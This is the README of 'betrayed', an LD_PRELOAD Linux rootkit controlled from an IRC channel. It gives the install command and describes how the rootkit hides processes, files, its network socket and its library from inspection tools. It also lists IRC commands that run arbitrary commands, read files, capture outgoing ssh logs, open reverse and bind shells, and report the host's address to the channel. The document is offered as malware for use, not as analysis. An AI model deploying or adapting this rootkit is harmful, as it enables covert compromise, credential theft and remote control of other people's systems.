# betrayed
### Basic info
betrayed is an LD_PRELOAD Linux rootkit which is controlled mainly from a IRC channel.  
It is free of any dependencies, and installs near enough instantly.  
 * Processes are hidden with a magic GID
 * Files/directories are hidden with extended attributes
 * Connections to the IRC server are hidden from plain sight. `netstat` will not show betrayed's socket connection.

 * Upon installation, betrayed will begin trying to create its initial fork process wherein it will connect to the server and join the specified channel.
 * By default, betrayed will only create its process & connect to the server if the calling process has root privs. You can turn this off by defining `DM_ROOT` in the config header.

betrayed's code is a very heavily modified and (de)restructured version of bedevil.
#### Usage
`./install.sh <host> '<channel>' [password]`
Upon completing installation, install.sh will `cat /dev/null`, which will cause betrayed to execute its initial fork process. Even without doing `cat /dev/null` at the end of the installation, any newly spawned process will initiate the connection to the IRC server.  
<b>Compile only:</b> `COMPILE_ONLY=1 ./install.sh ...` will compile betrayed.so in your cwd.  
When installing, `install.sh` will write `config.h`. After this header is present, simply running `./install.sh` will cause the script to read settings from the header. A new nick and magic GID will be generated.
  
Once installed, and assuming you are in your target channel, you will see a new user with a random nick join your channel. That is essentially the box that you installed betrayed on.
#### Available commands
```
 IRC commands:
      To use a command, send "<CMD NAME> <NICK/all> [any arguments]"
        "!EXEC", // executes given commands & sends resulting output to the channel.
        "!SSHL", // read outgoing ssh logs, send said logs to the channel.
        "!READ", // send file contents to the channel.
        "!REVR", // send a reverse shell to a given hort & port.
        "!BIND", // create a bind shell on given port.
        "!KILL", // remove the rootkit and all of its files and disconnect.
        "!DISC", // just disconnect. we will then reconnect when possible.
        "!INFO", // just send `uname -a` output to the channel.
        "!HELP", // send this command list to the channel.
        "!ADDR"  // send the address of the box to the channel. uses curl.
```

#### Notes
##### Hiding
 * betrayed hides itself from /proc/\*/maps, smaps, and numa_maps.
 * betrayed hides itself from `ldd`, among others.
 * 
 * No default systemd logs are created when utilising betrayed.
 * Only your installation's home directory is hidden (with extended attributes).
 * Processes are hidden with your magic GID.
 * betrayed only evades `netstat` output.

##### Connection
 * using !EXEC/!INFO may cause a short wait before you can do anything else.